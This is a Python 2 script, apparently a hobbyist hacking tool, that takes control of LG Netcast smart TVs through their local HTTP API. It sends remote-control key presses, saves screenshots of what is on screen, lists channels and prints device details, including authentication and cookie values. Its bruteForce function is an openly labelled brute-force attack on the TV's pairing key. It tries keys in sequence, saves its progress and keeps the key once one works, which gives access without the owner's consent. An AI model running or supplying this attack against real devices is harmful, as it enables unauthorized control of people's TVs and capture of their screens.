import argparse, requests, time, os, urllib, shutil
from xml.dom.minidom import parse, parseString

head = '''  
##    ## #### ########    ##    ## ########   #######  ##    ## ######## ########  
##   ##   ##  ##          ##   ##  ##     ## ##     ## ##   ##  ##       ##     ## 
##  ##    ##  ##          ##  ##   ##     ## ##     ## ##  ##   ##       ##     ## 
#####     ##  ######      #####    ########  ##     ## #####    ######   ########  
##  ##    ##  ##          ##  ##   ##   ##   ##     ## ##  ##   ##       ##   ##   
##   ##   ##  ##          ##   ##  ##    ##  ##     ## ##   ##  ##       ##    ##  
##    ## #### ##          ##    ## ##     ##  #######  ##    ## ######## ##     ##

Remote control LG TV (Netcast)
                                                                                                           
 v 1.0
 by EzeSoler
 ezesoler.com
'''

keySend = 444444
key = 0
numcapture = 1
help = """POWER = 1
NUM_0 = 2
NUM_1 = 3
NUM_2 = 4
NUM_3 = 5
NUM_4 = 6
NUM_5 = 7
NUM_6 = 8
NUM_7 = 9
NUM_8 = 10
NUM_9 = 11
UP = 12
DOWN = 13
LEFT = 14
RIGHT = 15
OK = 20
HOME = 21
MENU = 22
BACK = 23
VOLUME_UP = 24
VOLUME_DOWN = 25
MUTE = 26
CHANNEL_UP = 27
CHANNEL_DOWN = 28
BLUE = 29
GREEN = 30
RED = 31
YELLOW = 32
PLAY = 33
PAUSE = 34
STOP = 35
FF = 36
REW = 37
SKIP_FF = 38
SKIP_REW = 39
REC = 40
REC_LIST = 41
LIVE = 43
EPG = 44
INFO = 45
ASPECT = 46
EXT = 47
PIP = 48
SUBTITLE = 49
PROGRAM_LIST = 50
TEXT = 51
MARK = 52
_3D = 400
_3D_LR = 401
DASH = 402
PREV = 403
FAV = 404
QUICK_MENU = 405
TEXT_OPTION = 406
AUDIO_DESC = 407
NETCAST = 408
ENERGY_SAVE = 409
AV = 410
SIMPLINK = 411
EXIT = 412
RESERVE = 413
PIP_CHANNEL_UP = 414
PIP_CHANNEL_DOWN = 415
PIP_SWITCH = 416
APPS = 417"""

print head

if os.path.exists("Session.xml"):
	session_file = open("Session.xml", "r")
	keySend = int(session_file.read())
	
if os.path.exists("Key.xml"):
	key_file = open("Key.xml", "r")
	key = int(key_file.read())
	
headers = {'Content-Type': 'application/atom+xml'}

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--ip", help="Direccion IP del TV")
parser.add_argument("-k", "--key", help="Clave de emparejamiento")
args = parser.parse_args()

if args.ip:
	ip = args.ip	

print "IP TV: ",ip

def waitingCommand():
	command = raw_input("Esperando comando: ")
	if(command == "help"):
		print(help)
	elif (command == "quit"):
		quit()
	elif (command == "pic"):
		captureScreen()
	elif (command == "channels"):
		listChannels()
	elif (command == "info"):
		getInfoTv()
	else:
		sendingCommand(command)
	waitingCommand()
	
def captureScreen():
	print("Capturando pantalla...")
	global numcapture
	response = requests.get("http://"+ip+":8080/roap/api/data?target=screen_image&width=960&height=540&type=0", stream=True)
	with open('capture'+str(numcapture)+'.png', 'wb') as out_file:
		shutil.copyfileobj(response.raw, out_file)
		#img = Image.open('capture'+str(numcapture)+'.png')
		#img.show()
		out_file.close()
		os.system('start capture'+str(numcapture)+'.png')
		numcapture +=1
		
def listChannels():
	print("Enviando commando...")
	req = requests.get('http://'+ip+':8080/roap/api/data?target=channel_list')
	respond = req.text
	xmlRes = parseString(respond)
	channels = xmlRes.getElementsByTagName('data')
	
	for channel in channels:
		#El nombre del canal puede venir vacio, por eso el try solamente para ese valor.
		try:
			channelName = channel.getElementsByTagName('chname')[0].firstChild.nodeValue
		except AttributeError:
			channelName = ""
		print("Tipo: %s" % channel.getElementsByTagName('chtype')[0].firstChild.nodeValue)
		print("Numero: %s" % channel.getElementsByTagName('physicalNum')[0].firstChild.nodeValue)
		print("Nombre: %s" % channelName)
		print("---------------------------------------------------------------------------")

def getInfoTv():
	print("Enviando commando...")
	req = requests.get('http://'+ip+':8080/roap/api/data?target=tv_header')
	respond = req.text
	xmlRes = parseString(respond)
	print("X-Country-CP: %s" % xmlRes.getElementsByTagName('X-Country-CP')[0].firstChild.nodeValue)
	print("X-SDP-URL: %s" % xmlRes.getElementsByTagName('X-SDP-URL')[0].firstChild.nodeValue)
	print("X-Device-Product: %s" % xmlRes.getElementsByTagName('X-Device-Product')[0].firstChild.nodeValue)
	print("X-Device-Platform: %s" % xmlRes.getElementsByTagName('X-Device-Platform')[0].firstChild.nodeValue)
	print("X-Device-Model: %s" % xmlRes.getElementsByTagName('X-Device-Model')[0].firstChild.nodeValue)
	print("X-Device-Netcast-Platform-Versio: %s" % xmlRes.getElementsByTagName('X-Device-Netcast-Platform-Versio')[0].firstChild.nodeValue)
	print("X-Device-Eco-Info: %s" % xmlRes.getElementsByTagName('X-Device-Eco-Info')[0].firstChild.nodeValue)
	print("X-Device-Country-Group: %s" % xmlRes.getElementsByTagName('X-Device-Country-Group')[0].firstChild.nodeValue)
	print("X-Device-Publish-Flag: %s" % xmlRes.getElementsByTagName('X-Device-Publish-Flag')[0].firstChild.nodeValue)
	print("X-Device-ContentsQA-Flag: %s" % xmlRes.getElementsByTagName('X-Device-ContentsQA-Flag')[0].firstChild.nodeValue)
	print("X-Device-FW-Version: %s" % xmlRes.getElementsByTagName('X-Device-FW-Version')[0].firstChild.nodeValue)
	print("X-Device-SDK-VERSION: %s" % xmlRes.getElementsByTagName('X-Device-SDK-VERSION')[0].firstChild.nodeValue)
	print("X-Device-ID: %s" % xmlRes.getElementsByTagName('X-Device-ID')[0].firstChild.nodeValue)
	print("X-Device-Sales-Model: %s" % xmlRes.getElementsByTagName('X-Device-Sales-Model')[0].firstChild.nodeValue)
	print("X-Device-FCK: %s" % xmlRes.getElementsByTagName('X-Device-FCK')[0].firstChild.nodeValue)
	print("X-Device-Type: %s" % xmlRes.getElementsByTagName('X-Device-Type')[0].firstChild.nodeValue)
	print("X-Device-Language: %s" % xmlRes.getElementsByTagName('X-Device-Language')[0].firstChild.nodeValue)
	print("X-Device-Country: %s" % xmlRes.getElementsByTagName('X-Device-Country')[0].firstChild.nodeValue)
	print("X-Device-Remote-Flag: %s" % xmlRes.getElementsByTagName('X-Device-Remote-Flag')[0].firstChild.nodeValue)
	print("X-Authentication: %s" % xmlRes.getElementsByTagName('X-Authentication')[0].firstChild.nodeValue)
	print("cookie: %s" % xmlRes.getElementsByTagName('cookie')[0].firstChild.nodeValue)
	print("X-Device-Eula: %s" % xmlRes.getElementsByTagName('X-Device-Eula')[0].firstChild.nodeValue)
	print("---------------------------------------------------------------------------")
	
def sendingCommand(command):
	xml = """<command><name>HandleKeyInput</name><value>"""+str(command)+"""</value></command>"""
	print "Eviando comando..."
	req = requests.post('http://'+ip+':8080/roap/api/command', data=xml, headers=headers)
	respond = req.text
	xmlRes = parseString(respond)
	numRes = int(xmlRes.getElementsByTagName('ROAPError')[0].firstChild.nodeValue)
	if(numRes == 200):
		print("Commando enviado correctamente.")
	else:
		print ("Error al enviar el comando %s" % str(commando))

def connectTV():
	xml = """<auth><name>AuthReq</name><value>"""+str(key)+"""</value></auth>"""
	print("KEY: %s" % str(key))
	req = requests.post('http://'+ip+':8080/roap/api/auth', data=xml, headers=headers)
	respond = req.text
	xmlRes = parseString(respond)
	numRes = int(xmlRes.getElementsByTagName('ROAPError')[0].firstChild.nodeValue)
	if(numRes == 200):
		print("TV emparejado correctamente")
		waitingCommand()
	else:
		print ("Error al intentat emparejar TV con la key %s" % str(key))
		quit()
	
def bruteForce():
	validKey = False
	global keySend
	while not validKey:
		xml = """<auth><name>AuthReq</name><value>"""+str(keySend)+"""</value></auth>"""
		print("KEY: %s" % str(keySend))
		req = requests.post('http://'+ip+':8080/roap/api/auth', data=xml, headers=headers)
		respond = req.text
		#respond = """<?xml version="1.0" encoding="utf-8"?><envelope><ROAPError>401</ROAPError><ROAPErrorDetail>Unauthorized</ROAPErrorDetail></envelope>"""
		
		xmlRes = parseString(respond)
		numRes = int(xmlRes.getElementsByTagName('ROAPError')[0].firstChild.nodeValue)
		print("Respuesta: %s" % str(numRes))
		if(numRes == 200):
			key_file = open("Key.xml", "w")
			key_file.write("%s" % str(keySend))
			key_file.close()
			print("TV emparejado con la key: %s" % str(keySend))
			validKey = True
			waitingCommand()
		else:
			session_file = open("Session.xml", "w")
			session_file.write("%s" % str(keySend))
			session_file.close()
			keySend+= 1
			time.sleep(0.3)
		
if args.key:
	key = args.key
	connectTV()
elif (key != 0):
	print "Conectando con la key guardada en session anterior..."
	connectTV()
else:
	print "No se ingreso clave de emparejamiento"
	respuesta = raw_input("Desea un realizar un ataque de fuerza bruta? y/n ")
	if respuesta == "y":
		print "Iniciando ataque de fuerza bruta"
		bruteForce()
	else:
		quit()

